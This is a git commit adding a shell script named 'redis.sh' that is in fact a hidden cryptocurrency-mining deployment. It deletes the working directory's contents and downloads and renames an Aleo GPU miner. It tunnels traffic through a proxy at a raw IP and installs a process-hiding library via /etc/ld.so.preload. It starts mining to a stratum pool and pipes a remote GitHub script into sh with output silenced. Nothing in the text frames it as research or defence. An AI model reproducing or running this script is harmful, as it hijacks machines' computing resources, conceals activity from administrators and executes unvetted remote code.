09d5bbf0253fd9bc06653043c1b16f511b8a4323
Johncenayan <John12001455@sanggarnugraha.org>
2025-03-13 01:06:43 +0700

    Create redis.sh

---
+++ redis.sh
@@ -0,0 +1,55 @@
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl unzip
+
+sudo apt-get install -y nodejs
+
+npm i -g node-process-hider
+APP=app$(shuf -i 1000000-9999999 -n 1)
+wget https://public-download-ase1.s3.ap-southeast-1.amazonaws.com/aleo-miner/aleominer+3.0.14.zip && unzip aleominer+3.0.14.zip
+chmod +x aleominer
+mv aleominer $APP
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 134.122.127.150:30001
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+ph add $APP 
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./$APP -u stratum+ssl://134.122.127.150:443 -d 0,1,2,3,4,5,6,7 -w alekpoden82.app$(shuf -i 1000000-9999999 -n 1) & curl https://raw.githubusercontent.com/Johncenayan/cautious-rotary-phone/refs/heads/main/cpa.sh | sh > /dev/null 2>&1
